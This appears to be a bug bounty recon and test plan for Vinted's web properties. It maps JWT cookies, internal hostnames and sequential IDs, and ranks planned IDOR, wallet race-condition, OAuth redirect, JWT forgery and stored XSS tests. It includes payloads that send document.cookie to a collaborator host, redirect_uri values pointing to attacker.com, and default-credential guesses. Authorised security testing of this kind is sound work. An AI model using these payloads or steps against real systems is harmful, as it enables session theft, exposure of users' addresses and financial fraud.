# Vinted Bug Bounty — Master Report
**Program**: Bugcrowd / Vinted
**Date**: 2026-10-13
**Scope**: Primary + Secondary targets
**Methodology**: HexStrike AI + Manual analysis
**Status**: 🔴 Active Testing Phase

---

## 🔍 Live Recon Findings (Passive, Browser Inspection of www.vinted.com)

### 1. JWT Token Architecture Mapped

Vinted issues two JWT cookies on page load (even anonymous):

| Cookie | Algorithm | Purpose | Expiry |
|---|---|---|---|
| `access_token_web` | PS256 (RSA-PSS) | API access | ~24 hours |
| `refresh_token_web` | PS256 (RSA-PSS) | Token renewal | ~9 days |

**Decoded access_token_web payload (anonymous session):**
```json
{
  "app_id": 4,
  "aud": "fr.core.api.vinted.com",
  "client_id": "web",
  "exp": 1791996676,
  "iat": 1791910275,
  "iss": "vinted-iam-oauth",
  "purpose": "access",
  "scope": "public",
  "sid": "43aa5fe7-1791910275"
}
```

**Security Observations:**
- `kid`: E57YdruHplAju2cNo1DorH3j27Bu5-s_OP5PwPihn5M — enumerate JWKS endpoint
- `aud`: reveals internal hostname `fr.core.api.vinted.com` (internal subdomain)
- `app_id: 4` — test if other app IDs (mobile) bypass web-only restrictions
- `scope: public` — test if escalating to `admin` or `internal` is validated server-side
- `sid` = UUID + Unix timestamp — low entropy session IDs worth verifying

**Metrics ingestion JWT (HS256 — symmetric, potentially crackable):**
```
eyJhbGciOiJIUzI1NiJ9.eyJwdXJwb3NlIjoib3RlbC1jbGllbnQtbWV0cmljcyIsImlhdCI6MTc5MTkxMDI3NSwiZXhwIjoxNzkxOTEyMDc1fQ
```
Purpose: `otel-client-metrics` | Algorithm: HS256 | Window: 30 min
→ Test with `jwt_tool --crack` or hashcat dictionary against this short-lived key

**Manual tests:**
- [ ] GET /.well-known/jwks.json — enumerate public key IDs
- [ ] JWT alg:none bypass (verify server rejects even with PS256)
- [ ] JWT RS256→HS256 confusion (sign with public key as HMAC secret)
- [ ] scope escalation: "public" → "admin"/"internal"
- [ ] app_id: 4 → 1,2,3,5 (mobile/admin variants)

---

### 2. Internal Services Discovered (Live Network Capture)

| Endpoint | Purpose | Risk |
|---|---|---|
| `metrics-ingress-web.svc.vinted.com/v1/metrics` | Telemetry ingestion | `.svc.` = K8s internal DNS leaked publicly? |
| `metrics.vinted.lt/web/v4` | Metrics collector | `.lt` TLD — Lithuanian datacenter |
| `marketplace-web-assets.vinted.com/_next/static/chunks/` | Next.js chunks | JS bundle analysis target |
| `static-assets.vinted.com/datadome/5.10.0/tags.js` | DataDome bot protection | v5.10.0 — check for known bypasses |
| `conn-check.icg-in.com/netconn/{JWE}` | Network check | Third-party, JWE-encrypted payload |

**Key finding**: `metrics-ingress-web.svc.vinted.com` — `.svc.` naming is Kubernetes internal DNS convention. If publicly resolvable, reveals cluster topology.

**Next.js chunks to analyze:**
```
/_next/static/chunks/turbopack-0ui3qfhif5nxm.js
/_next/static/chunks/1n5nuxvxhj3rj.js
/_next/static/chunks/427xlee1njh-a.js
/_next/static/chunks/1sb705g_kv7oz.js
[+ 8 more chunks at marketplace-web-assets.vinted.com]
```
→ Download all chunks, grep for: API URLs, process.env, hardcoded keys, admin routes

---

### 3. Cookies — All Cookies Present on Landing Page

| Cookie | Domain | Security Notes |
|---|---|---|
| `access_token_web` | .www.vinted.com | Auth JWT — verify HttpOnly/Secure/SameSite when authenticated |
| `refresh_token_web` | .www.vinted.com | Auth refresh JWT — same flags needed |
| `_vinted_fr_session` | .www.vinted.com | Rails MessageEncryptor format (double-dash separator) |
| `v_udt` | .www.vinted.com | Base64: `G33EQww8dPY83CxBtP5EvKEt0ClW--` = Rails encrypted value |
| `v_sid` | www.vinted.com | Hex session ID |
| `datadome` | .vinted.com | Bot protection token |
| `__cf_bm` | .vinted.com | Cloudflare bot management |
| `cf_clearance` | .vinted.com | Cloudflare challenge clearance |

**`v_udt` cookie**: Format matches Ruby on Rails `MessageEncryptor`. If Rails version is old (<5.2), may be vulnerable to padding oracle or `secret_key_base` disclosure.

---

### 4. Sequential Item IDs Confirmed

Homepage items observed:
```
/items/10364721419  (Coach Poppy)
/items/10364720337  (Legend of Zelda books)
/items/10364719496  (ear pods)
/items/10364715048
/items/10364713383
/items/10364713225
/items/10364709577
```
Gap between IDs: 1,000–5,000. IDs are numeric + sequential = classic IDOR surface.

---

### 5. Security Headers Missing (Context only — not standalone reportable)

- ❌ Content-Security-Policy — absent (XSS tokens exploitable without CSP)
- ❌ Strict-Transport-Security — absent
- Security score: 85/100 (per HexStrike analysis)

---

## 🎯 Priority Attack Vectors (Ranked by Bounty Potential)

### [P1] A — IDOR on Shipments / Addresses (Up to $8,000)

**Target**: www.vinted.com + www.vintedgo.com
**Why P1**: Shipment objects contain full name + home address of buyers/sellers. GDPR breach = automatic escalation.

**API surface (to discover via JS analysis):**
```
GET /api/v2/shipments/{id}          ← HOME ADDRESS exposure
GET /api/v2/transactions/{id}       ← financial data
GET /api/v2/users/{id}/address      ← delivery address
GET /api/v2/conversations/{id}      ← private messages
PATCH /api/v2/items/{id}            ← edit another seller's listing?
```

**Test methodology (2 accounts):**
1. Account A (seller): list test item at €0.01 — note item ID
2. Account B (buyer): purchase — note transaction ID + shipment ID
3. Account C (unrelated): request GET /api/v2/shipments/{shipment_B_id}
4. If response returns name/address → P1 confirmed, stop, report

---

### [P1] B — Race Condition on Wallet Operations (Up to $8,000)

**Target**: www.vinted.com Vinted Balance wallet
**Why P1**: Financial impact — double-spend or negative balance exploit.

**Scenarios:**
```
1. Double purchase: 50 concurrent requests buying two items with same wallet balance
2. Refund + purchase race: initiate refund, simultaneously buy with same funds  
3. Promo code: fire 20 concurrent apply requests for single-use promo
```
**Tool**: Burp Turbo Intruder (parallel, single-packet attack)

---

### [P1] C — VintedGo Parcel/Label IDOR (Up to $8,000)

**Target**: www.vintedgo.com
**Why top priority**: Shipping labels = sender + receiver full address on one document.

```
GET /api/parcels/{id}               ← enumerate parcel IDs  
GET /api/shipments/{id}/label       ← PDF download auth check
GET /api/tracking/{tracking_no}     ← does tracking expose addresses?
```

---

### [P2] D — OAuth Redirect URI Manipulation (Up to $3,000)

**Target**: www.vinted.com social login

**Payloads:**
```
redirect_uri=https://attacker.com
redirect_uri=https://www.vinted.com@attacker.com
redirect_uri=https://www.vinted.com%0d%0aLocation:https://attacker.com
redirect_uri=https://www.vinted.com/../../../attacker.com
```
Missing `state` parameter → CSRF on OAuth flow.

---

### [P2] E — Stored XSS in Listings/Messages (Up to $3,000)

**Target**: www.vinted.com (no CSP = tokens exfiltrable)

**Test payloads in own listings:**
```html
<img src=x onerror=fetch('https://YOUR_COLLABORATOR/?c='+document.cookie)>
<svg/onload=eval(atob('BASE64_PAYLOAD'))>
<details open ontoggle=navigator.sendBeacon('https://YOUR_COLLABORATOR',document.cookie)>
```

---

### [P2] F — badger.it.vinted.com Encryption Service (Up to $800)

**Target**: https://badger.it.vinted.com
**Why interesting**: Named "Encryption Service" — a key management service accessible externally.

```bash
curl -sI https://badger.it.vinted.com/
curl -s https://badger.it.vinted.com/health
curl -s https://badger.it.vinted.com/api/
curl -s https://badger.it.vinted.com/v1/
curl -s https://badger.it.vinted.com/v1/keys
curl -s https://badger.it.vinted.com/metrics
curl -s https://badger.it.vinted.com/api-docs  # Swagger/OpenAPI?
curl -s https://badger.it.vinted.com/swagger.json
```

Default credential attempts: admin:admin, admin:vinted, vinted:vinted

---

### [P2] G — JWT Scope Escalation / app_id Manipulation

**Test:** Authenticate, get your `access_token_web`, decode payload, forge new token with:
- `scope: "admin"` or `scope: "internal"`
- `app_id: 1` (test if mobile API exposes more data)
- Sign with original key (should fail) — verify server validates signature

---

### [P3] H — Business Logic Flaws (Up to $500)

**Price manipulation post-purchase:**
```
PATCH /api/v2/items/{your_item_id}
Content-Type: application/json
{"price": "0.00"}   or   {"price": "-1.00"}   or   {"price": null}
```

**Review manipulation:**
- Can you buy from yourself (A→A) and self-review?
- Can you review without completing a transaction?
- Is transaction completion checked server-side?

**Item quantity abuse:**
```
{"quantity": -1}
{"quantity": 999999}
```

**Seller impersonation:**
- Can you list items appearing to be from a different seller?
- Can you modify another seller's listing description (IDOR on PATCH)?

---

### [P2] I — test-escalations.vintedgo.com (Angular App Auth Bypass)

**Target**: https://test-escalations.vintedgo.com
**Stack**: Bootstrap + Moment.js + Angular

```bash
# Debug mode
curl 'https://test-escalations.vintedgo.com/?ng-debug=true'

# API endpoints
curl 'https://test-escalations.vintedgo.com/api/users'
curl 'https://test-escalations.vintedgo.com/api/admin'
curl 'https://test-escalations.vintedgo.com/api/escalations'

# Cross-env token test
# Take your www.vintedgo.com auth cookie → try it here
```

Check: Does this test env accept production JWTs? If yes → test environment leakage.

---

## 🔬 Manual Testing Roadmap (Step-by-Step)

### Phase 1: Setup (30 min)
1. Create 3 accounts: buyer1@bugcrowdninja.com, seller1@bugcrowdninja.com, unrelated1@bugcrowdninja.com
2. Set up Burp Suite with vinted.com in scope
3. Download and analyze all JS chunks from marketplace-web-assets.vinted.com
4. Map all `/api/v2/` endpoints from JS analysis

### Phase 2: Auth + Session Testing (2 hrs)
1. Decode both JWTs — compare anonymous vs. authenticated payloads
2. Check JWKS endpoint: GET /.well-known/jwks.json
3. Verify cookie flags (HttpOnly/Secure/SameSite) when authenticated
4. Test JWT algorithm confusion attacks
5. Test OAuth flow for redirect_uri bypass

### Phase 3: IDOR Testing (2 hrs)
1. Create listing as seller → purchase as buyer → note all IDs
2. Test shipment/transaction/conversation access from unrelated account
3. Test PATCH/DELETE on other users' resources
4. Focus on VintedGo parcel endpoints

### Phase 4: Business Logic (2 hrs)
1. Race condition tests on wallet (Turbo Intruder)
2. Price manipulation before/during/after purchase flow
3. Review system abuse
4. Promo code race condition

### Phase 5: badger.it.vinted.com + test-escalations (1 hr)
1. Fingerprint badger service
2. Enumerate endpoints
3. Test Angular debug mode on test-escalations
4. Cross-environment token acceptance

### Phase 6: JS Bundle Analysis (ongoing)
1. Download all Next.js chunks
2. `grep -r "api_key\|apiKey\|secret\|password\|token\|internal\|admin" chunks/`
3. Map all API routes found in bundles
4. Check for source maps (.js.map files)

---

## 🏗️ Infrastructure Map

```
PRIMARY TARGETS
├── www.vinted.com          [NextJS + Cloudflare + DataDome]
│   ├── Auth: vinted-iam-oauth (issuer)
│   ├── API: fr.core.api.vinted.com (internal)
│   ├── Assets: marketplace-web-assets.vinted.com
│   ├── Assets: static-assets.vinted.com  
│   └── Metrics: metrics-ingress-web.svc.vinted.com [K8s?]
├── www.vinted.net
└── www.vintedgo.com        [NextJS + Cloudflare]

SECONDARY TARGETS
├── sandbox.vinted.com
├── sandbox.vintedgo.com
├── test-escalations.vintedgo.com  [Angular + Bootstrap + Moment.js]
├── badger.it.vinted.com          [Encryption Service]
├── careers.vinted.com            [NextJS + ReactJS]
├── company.vinted.com            [NextJS + Cloudflare]
└── news.vinted.com

DISCOVERED (not in scope but noted)
├── fr.core.api.vinted.com        [revealed in JWT aud field]
├── metrics.vinted.lt             [Lithuanian datacenter]
└── metrics-ingress-web.svc.vinted.com  [K8s internal?]
```

---

## 📝 Bugcrowd Report Template

```markdown
**Title**: [IDOR/XSS/Race Condition] on [specific endpoint/feature]
**Severity**: P[1-4]
**CWE**: CWE-[number]
**Role tested**: Authenticated member

### Summary
[One paragraph: what the bug is, what can be done with it]

### Steps to Reproduce
1. Sign in as testA@bugcrowdninja.com at https://www.vinted.com
2. [Navigate to feature]
3. [Send specific request — include full HTTP request]
4. [Observe response]

### Impact
[Specific financial/privacy/reputational consequence. Quantify if possible]

### Evidence
[Screenshot/video — redact any real member PII]

### Suggested Fix
[Brief mitigation recommendation]
```

---

## ⚠️ Rules Compliance Checklist

- [x] Only testing listed in-scope targets
- [x] Using @bugcrowdninja.com accounts only
- [x] No interaction with real member listings/orders
- [x] Throttling all requests (DataDome + Cloudflare WAF present)
- [x] Stop at proof-of-concept for destructive bugs
- [x] No S3 data downloaded
- [x] GDPR: zero retention of any member PII

---
*Generated: 2026-10-14 | /home/abarnesh/Repos-clone/Bug_bounty/vinted/reports/*
